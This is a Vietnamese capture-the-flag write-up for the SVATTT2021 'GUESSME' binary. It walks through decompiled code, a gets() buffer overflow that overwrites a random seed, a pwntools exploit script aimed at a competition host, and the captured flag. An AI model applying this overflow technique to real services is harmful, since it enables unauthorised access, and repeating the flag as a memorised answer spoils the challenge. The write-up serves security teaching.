# GUESSME

## REVERSE FILE
Xem thông số của file:
```sh
guessme_7337bdcf5e89841274190799663b0af6: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, stripped
```
checksec file
```sh
[*] '/mnt/c/Users/n18dc/OneDrive/Desktop/SVATTT2021/Vòng Khởi động/guessme_7337bdcf5e89841274190799663b0af6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
Chương trình sẽ thực thi như sau, đọc từ "/dev/urandom" vào chuỗi (S2 + 30) 1 lần 4 byte.
```sh
 stream = fopen("/dev/urandom", "rb");
  fread(s2 + 30, 1uLL, 4uLL, stream);
```

Nhập từ người dùng
```sh
printf("Guess a number: ");
gets(s2);
```

Sau đó setup giá trị cho bài guess_me, để người chơi đoán.
```sh
memset(v6, 0, sizeof(v6));
  LODWORD(v6[0]) = *(_DWORD *)(s2 + 30);
  for ( i = 1; i <= 0xF; ++i )
    *((_DWORD *)v6 + i) = 0x41C64E6D * *((_DWORD *)v6 + i - 1) + 12345;
  sub_4011F6((__int64)v6);
  v3 = sub_401241();
  sprintf(s, "%08x", v3);
  if ( !strcmp(s, s2) )
  {
    v7 = fopen("flag", "rt");
    if ( v7 )
    {
      memset(s, 0, sizeof(s));
      fread(s, 1uLL, 0x80uLL, v7);
      printf("Flag: %s\n", s);
      fclose(v7);
    }
  }
  else
  {
    puts("Try again");
  }
```
Chỉ cần đoán đúng giá trị thì chúng ta sẽ có flag.

## EXPLOIT

Giá trị biến (s2+30) được nhận giá trị từ "/dev/urandom", mà urandom này sẽ ngẫu nhiên, đưa vào trong các thuật thoán biến đổi --> cho ra 1 giá trị cũng thay đổi.
Chương trình có hàm gets(s2) --> buffer overflow

Mình sẽ dè giá trị của (s2+30) làm cho chương trình sẽ luôn nhận 1 đầu vào nhất định --> cho ra 1 đầu ra nhất định, 1 giá trị nhất định. 

```gdb
 ► 0x401511    call   strcmp@plt                      <strcmp@plt>
        s1: 0x7fffffffde80 ◂— 'd262d4d3'
        s2: 0x405260 ◂— '12312300000000000000000000000000000000000000000000000000000000000000000000000000000'
```

Vậy chỉ cần nhập giá trị `d262d4d3` + "\x00" + "0"*50 để hàm strcmp kiểm tra sẽ chỉ lấy đến \x00, và đè lên phần (s+30) đúng như những gì mình đã tính trước đó.

File exploit
```sh
from pwn import *
# s=process("./guessme_7337bdcf5e89841274190799663b0af6")
s = remote("125.235.240.166",20102)
pause()
payload = "d262d4d3\x00" + "0"*56
s.sendline(payload)
s.interactive()

# ASCIS{just_another_old_school_problem}
```


